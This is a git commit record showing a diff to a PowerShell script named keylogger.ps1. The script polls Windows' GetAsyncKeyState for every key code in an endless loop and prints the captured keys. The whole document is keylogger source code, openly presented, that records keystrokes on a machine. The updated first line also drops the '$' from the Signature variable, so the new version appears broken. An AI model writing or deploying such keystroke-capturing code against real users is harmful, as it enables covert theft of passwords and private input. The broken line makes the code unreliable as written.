48324b104afca10bd173c89e6c6229f8193e695f
Androsh7 <150483650+Androsh7@users.noreply.github.com>
2024-09-02 22:53:11 -0400

    Update keylogger.ps1

--- keylogger.ps1
+++ keylogger.ps1
@@ -1,44 +1,26 @@
-$Signature = @'
+Signature = @'
     [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
     public static extern short GetAsyncKeyState(int virtualKeyCode); 
 '@
 Add-Type -MemberDefinition $Signature -Name Keyboard -Namespace PsOneApi
+# 160:16 = Left shift
+# 161:16 = Right shift
 # 13 = enter
 # 9 = tab
-$cap_state = $false
-$last_shift_state = $false
+# 20 = caps
+# 8 = backspace
+# 219 = del
+# 1 = LMB
+# 2 = RMB
 do
 {
- 	$shift_state = $false
-  
-    	# checks shift (16) key state
- 	if ( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState([byte]16) -eq -32767)) { 
-  		$shift_state = !$shift_state
-	}
-
- 	
-  
- 	# check backspace (8) or del (219)
- 	if ( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState([byte]8) -eq -32767 -or [PsOneApi.Keyboard]::GetAsyncKeyState([byte]219) -eq -32767)) { 
-  		write-host -nonewline "\d"
-	}  
-  
-
-
-  	# checks capslock (20) key state
-  	if ( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState([byte]20) -eq -32767)) {
-    		$cap_state = !$cap_state
-    	}
-
-	
- 	# Keyboard output only gives A-Z0-9, upper/lowercase and symbols must be enumerated by shift key
-	for ($i = 0; $i -le 165; $i = $i + 1)
+	for ($i = 0; $i -le 255; $i = $i + 1)
 	{
 		$keynum = [byte]$i
 		if ( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState($keynum) -eq -32767))
 		{
 			$outkey = $keynum
-			Write-Host -nonewline $outkey
+			Write-Host -nonewline "${outkey}:"
 		}
 	}
 } while($true)
